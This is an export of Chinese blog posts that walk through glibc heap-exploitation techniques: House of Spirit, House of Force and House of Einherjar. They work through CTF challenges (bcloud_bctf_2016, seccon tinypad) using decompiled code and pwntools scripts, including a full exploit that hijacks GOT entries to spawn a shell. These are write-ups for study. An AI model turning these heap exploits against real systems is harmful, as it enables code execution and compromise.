<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>House Of Spirit</title>
    <url>/2023/04/10/House%20Of%20Spirit/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<pre><code>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。
fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
</code></pre>
<p>想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。</p>
]]></content>
      <tags>
        <tag>House of 系列</tag>
      </tags>
  </entry>
  <entry>
    <title>House Of Force</title>
    <url>/2023/04/10/House%20of%20Force/</url>
    <content><![CDATA[<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p>
<p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p>
<p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p>
<h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><pre><code>// 获取当前的top chunk，并计算其对应的大小
victim = av-&gt;top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
</code></pre>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk</p>
<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><pre><code>int add()
{
  int result; // eax
  int i; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt;= 9 &amp;&amp; heap_array[i]; ++i )
    ;
  if ( i == 10 )
    return puts("Lack of space. Upgrade your account with just $100 :)");
  puts("Input the length of the note content:");
  v2 = choose();
  heap_array[i] = malloc(v2 + 4);
  if ( !heap_array[i] )
    exit(-1);
  dword_804B0A0[i] = v2;
  puts("Input the content:");
  readd(heap_array[i], v2, 10);
  printf("Create success, the id is %d\n", i);
  result = i;
  dword_804B0E0[i] = 0;
  return result;
}
</code></pre>
<p>add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写</p>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><pre><code>int edit()
{
  unsigned int v1; // [esp+14h] [ebp-14h]
  int v2; // [esp+18h] [ebp-10h]
  int v3; // [esp+1Ch] [ebp-Ch]

  puts("Input the id:");
  v1 = choose();
  if ( v1 &gt;= 0xA )
    return puts("Invalid ID.");
  v2 = heap_array[v1];
  if ( !v2 )
    return puts("Note has been deleted.");
  v3 = dword_804B0A0[v1];
  dword_804B0E0[v1] = 0;
  puts("Input the new content:");
  readd(v2, v3, 10);
  return puts("Edit success.");
}
</code></pre>
<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><pre><code>int delete()
{
  unsigned int v1; // [esp+18h] [ebp-10h]
  void *index; // [esp+1Ch] [ebp-Ch]
  puts("Input the id:");
  v1 = choose();
  if ( v1 &gt;= 0xA )
    return puts("Invalid ID.");
  index = heap_array[v1];
  if ( !index )
    return puts("Note has been deleted.");
  heap_array[v1] = 0;
  dword_804B0A0[v1] = 0;
  free(index);  #UAF
  return puts("Delete success.");
}
</code></pre>
<p>delete函数在释放chunk时存在UAF漏洞</p>
<h3 id="自定义一个read函数"><a href="#自定义一个read函数" class="headerlink" title="自定义一个read函数"></a>自定义一个read函数</h3><pre><code>int __cdecl readd(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt; a2; ++i )
  {
    if ( read(0, &amp;buf, 1u) &lt;= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(a1 + i) = buf;
  }
  *(i + a1) = 0;
  return i;
}
</code></pre>
<p>三个参数，a1为要输入的地址，a2为输入大小，a3为截止符</p>
<h4 id="先把前面的一些东西写好"><a href="#先把前面的一些东西写好" class="headerlink" title="先把前面的一些东西写好"></a>先把前面的一些东西写好</h4><pre><code>from pwn import *
from LibcSearcher import *
context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()
#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
sh = process('./bcloud_bctf_2016')
#sh = remote('node4.buuoj.cn',26937)
elf = ELF('./bcloud_bctf_2016')
def add(size,content):
   sla('&gt;&gt;','1')
   sla('note content:',str(size))
   sa('content:',content)
 
def edit(index,content):
   sla('&gt;&gt;','3')
   sla('id:',str(index))
   sa('content:',content)
 
def delete(index):
   sla('&gt;&gt;','4')
   sla('id:',str(index))
</code></pre>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞<br class='item-img' data-src='https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来</p>
<pre><code>sa('name:','a'*64)
ru('a'*64)
heap_addr = u32(r(4)) - 0x8
lg('heap_addr',heap_addr)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>再看另一个函数<br class='item-img' data-src='https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><pre><code>-0000005C v2 dd ?
-00000058 db ? ; undefined
-00000057 db ? ; undefined
..........
-00000016 db ? ; undefined
-00000015 db ? ; undefined
-00000014 v4 dd ?
-00000010 db ? ; undefined
-0000000F db ? ; undefined
-0000000E db ? ; undefined
-0000000D db ? ; undefined
</code></pre>
<p>这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）</p>
<pre><code>sa('Org:','a'*0x40)
sla('Host:',p32(0xFFFFFFFF))
top_chunk_addr = heap_addr  + 0x48*3 - 0x8
lg('top_chunk_addr',(top_chunk_addr))
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，<br>因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，</p>
<pre><code>offset = heap_array - （top_chunk_addr +0x8）- 0x8
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，<br>之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，</p>
<pre><code>add(offset,'\n')	
add(0x18,'\n')
</code></pre>
<p>之后编辑chunk_1来修改heap_array数组</p>
<pre><code>puts_plt = elf.plt['puts']
__libc_start_main_got = elf.got['__libc_start_main']
free_got = elf.got['free']
edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\x00'*0x8)
</code></pre>
<p>此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）</p>
<pre><code>edit(1,p32(puts_plt) + b'\n')
</code></pre>
<p>此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址</p>
<pre><code>delete(2)
dbg()
</code></pre>
<p>free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址<br class='item-img' data-src='https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<pre><code>#本地
one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]
libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
#buu远程
#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
#libc = ELF('../../libc-2.23.so--32')
libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']
onegadget = one_gadget[3] + libc_base
</code></pre>
<p>再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\x00”)，获得shell。</p>
<pre><code>    delete(1)
    itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *
from LibcSearcher import *
context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()
#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))

sh = process('./bcloud_bctf_2016')
#sh = remote('node4.buuoj.cn',26937)

elf = ELF('./bcloud_bctf_2016')
puts_plt = elf.plt['puts']
__libc_start_main_got = elf.got['__libc_start_main']
free_got = elf.got['free']
heap_array = 0x0804B120
 
def add(size,content):
   sla('&gt;&gt;','1')
   sla('note content:',str(size))
   sa('content:',content)
 
def edit(index,content):
   sla('&gt;&gt;','3')
   sla('id:',str(index))
   sa('content:',content)
 
def delete(index):
   sla('&gt;&gt;','4')
   sla('id:',str(index))
def main():
    sa('name:','a'*64)
    ru('a'*64)
    heap_addr = u32(r(4)) 
    lg('heap_addr',heap_addr)
    #dbg()
    sa('Org:','a'*0x40)
    #修改top chunk的size为-1（0xFFFFFFFF）
    sla('Host:',p32(0xFFFFFFFF))
    top_chunk_addr = heap_addr + 0x48*3-0x8
    lg('top_chunk_addr',(top_chunk_addr))
    offset = heap_array - (top_chunk_addr +0x8)- 0x8
    lg('offset',offset)
    add(offset,'') #0
    add(0x18,'\n') #1
    edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10)  + b'\x00'*8)
    edit(1,p32(puts_plt) + b'\n')
    #泄露__libc_start_main_got的地址
    delete(2)
    r(1)
    __libc_start_main_addr = u32(r(4))
    lg('__libc_start_main',__libc_start_main_addr)
    #dbg()
    '''
    libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
    libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
    system_addr = libc_base + libc.dump('system')
    lg('libc_base',(libc_base))
    lg('system_addr',(system_addr))
    edit(1,p32(system_addr) + b'\n')
    '''
    #本地
    one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]
    libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
    #buu远程
    #one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    #libc = ELF('../../libc-2.23.so--32')
    libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']
    onegadget = one_gadget[3] + libc_base
    edit(1,p32(onegadget) + b'\n')
    #getshell
    delete(1)
    itr()
main()
</code></pre>
]]></content>
      <tags>
        <tag>House of 系列</tag>
      </tags>
  </entry>
  <entry>
    <title>House of einherjar</title>
    <url>/2023/04/10/House%20of%20Einherjar/</url>
    <content><![CDATA[<h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p>
<p>free 函数中的后向合并核心操作如下</p>
<pre><code>    /* consolidate backward */
    if (!prev_inuse(p)) {
        prevsize = prev_size(p);
        size += prevsize;
        p = chunk_at_offset(p, -((long) prevsize));
        unlink(av, p, bck, fwd);
    }
</code></pre>
<blockquote>
<p>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))<br class='item-img' data-src='https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="思路1：两个chunk通过后向unlink直接实现任意地址写"><a href="#思路1：两个chunk通过后向unlink直接实现任意地址写" class="headerlink" title="思路1：两个chunk通过后向unlink直接实现任意地址写"></a>思路1：两个chunk通过后向unlink直接实现任意地址写</h2><p>假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。</p>
<h2 id="思路2：三个chunk通过后向unlink实现double-free"><a href="#思路2：三个chunk通过后向unlink实现double-free" class="headerlink" title="思路2：三个chunk通过后向unlink实现double free"></a>思路2：三个chunk通过后向unlink实现double free</h2><pre><code>chunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache 
chunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inuse
chunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小
chunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中
</code></pre>
<p>申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。</p>
<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016_seccon_tinypad"></a>2016_seccon_tinypad</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851" alt="img"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk<br class='item-img' data-src='https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
<h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>主函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  int choice; // eax
  int v5; // eax
  __int64 v6; // rax
  size_t v7; // rax
  int c; // [rsp+4h] [rbp-1Ch] BYREF
  int i; // [rsp+8h] [rbp-18h]
  int index; // [rsp+Ch] [rbp-14h]
  int v12; // [rsp+10h] [rbp-10h]
  int v13; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v14; // [rsp+18h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  v12 = 0;
  write_n(&amp;unk_4019F0, 1uLL);
  write_n(
    "  ============================================================================\n"
    "// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n"
    "||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n"
    "||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n"
    "||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n"
    "\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n"
    "  ============================================================================\n",
    563uLL);
  write_n(&amp;unk_4019F0, 1uLL);
  do
  {
    for ( i = 0; i &lt;= 3; ++i )
    {
      LOBYTE(c) = i + 49;
      writeln("+------------------------------------------------------------------------------+\n", 81LL);
      write_n(" #   INDEX: ", 12uLL);
      writeln(&amp;c, 1LL);
      write_n(" # CONTENT: ", 12uLL);
      if ( *&amp;tinypad[16 * i + 264] )
      {
        v3 = strlen(*&amp;tinypad[16 * i + 264]);
        writeln(*&amp;tinypad[16 * i + 264], v3);
      }
      writeln(&amp;unk_4019F0, 1LL);
    }
    index = 0;
    choice = getcmd();
    v12 = choice;
    if ( choice == 68 )
    {
      write_n("(INDEX)&gt;&gt;&gt; ", 11uLL);
      index = read_int();
      if ( index &lt;= 0 || index &gt; 4 )            // 只能申请四个chunk
                                                // 
      {
LABEL_29:
        writeln("Invalid index", 13LL);
        continue;
      }
      if ( !*&amp;tinypad[16 * index + 240] )
      {
LABEL_31:
        writeln("Not used", 8LL);
        continue;
      }
      free(*&amp;tinypad[16 * index + 248]);
      *&amp;tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0
      writeln("\nDeleted.", 9LL);      					//uaf
    }
    else if ( choice &gt; 0x44 )
    {
      if ( choice != 0x45 )
      {
        if ( choice == 81 )
          continue;
LABEL_41:
        writeln("No such a command", 17LL);
        continue;
      }
      write_n("(INDEX)&gt;&gt;&gt; ", 11uLL);
      index = read_int();
      if ( index &lt;= 0 || index &gt; 4 )
        goto LABEL_29;
      if ( !*&amp;tinypad[16 * index + 240] )
        goto LABEL_31;
      c = 48;
      strcpy(tinypad, *&amp;tinypad[16 * index + 248]);
      while ( toupper(c) != 89 )
      {
        write_n("CONTENT: ", 9uLL);
        v6 = strlen(tinypad);
        writeln(tinypad, v6);
        write_n("(CONTENT)&gt;&gt;&gt; ", 13uLL);
        v7 = strlen(*&amp;tinypad[16 * index + 248]);
        read_until(tinypad, v7, 10u);
        writeln("Is it OK?", 9LL);
        write_n("(Y/n)&gt;&gt;&gt; ", 9uLL);
        read_until(&amp;c, 1uLL, 10u);
      }
      strcpy(*&amp;tinypad[16 * index + 248], tinypad);
      writeln("\nEdited.", 8LL);
    }
    else
    {
      if ( choice != 65 )
        goto LABEL_41;
      while ( index &lt;= 3 &amp;&amp; *&amp;tinypad[16 * index + 256] )
        ++index;
      if ( index == 4 )
      {
        writeln("No space is left.", 17LL);
      }
      else
      {
        v13 = -1;
        write_n("(SIZE)&gt;&gt;&gt; ", 10uLL);
        v13 = read_int();
        if ( v13 &lt;= 0 )
        {
          v5 = 1;
        }
        else
        {
          v5 = v13;
          if ( v13 &gt; 0x100 )
            v5 = 256;
        }
        v13 = v5;
        *&amp;tinypad[16 * index + 256] = v5;
        *&amp;tinypad[16 * index + 264] = malloc(v13);
        if ( !*&amp;tinypad[16 * index + 264] )
        {
          writerrln("[!] No memory is available.", 27LL);
          exit(-1);
        }
        write_n("(CONTENT)&gt;&gt;&gt; ", 13uLL);
        read_until(*&amp;tinypad[16 * index + 264], v13, 10u);
        writeln("\nAdded.", 7LL);
      }
    }
  }
  while ( v12 != 81 );
  return 0;
}
</code></pre>
<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
<pre><code>    *&amp;tinypad[16 * index + 0x100] = v5;
    *&amp;tinypad[16 * index + 264] = malloc(v13);
</code></pre>
<p>存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针</p>
<h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>该edit函数调用的read_until函数存在off-by-null漏洞</p>
<h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851" alt="img"><br>free函数存在uaf漏洞</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先泄露libc和heap地址</p>
<p>利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p>
<p>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook</p>
<pre><code>v6 = strlen(tinypad);
</code></pre>
<p>可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell</p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>先把前面的代码写好</p>
<pre><code># coding=utf-8
from pwn import*
context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
sh = process('./tinypad')
libc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')

#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims             :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()

def add(size, content='a'):
    sla('(CMD)&gt;&gt;&gt; ','a')
    sla('(SIZE)&gt;&gt;&gt; ',str(size))
    sla('(CONTENT)&gt;&gt;&gt; ',content)



def edit(idx, content):
    sla('(CMD)&gt;&gt;&gt; ','e')
    sla('(INDEX)&gt;&gt;&gt; ',str(idx))
    sla('(CONTENT)&gt;&gt;&gt; ',content)
    sla('Is it OK?\n','Y')
   


def free(idx):
    sla('(CMD)&gt;&gt;&gt; ','d')
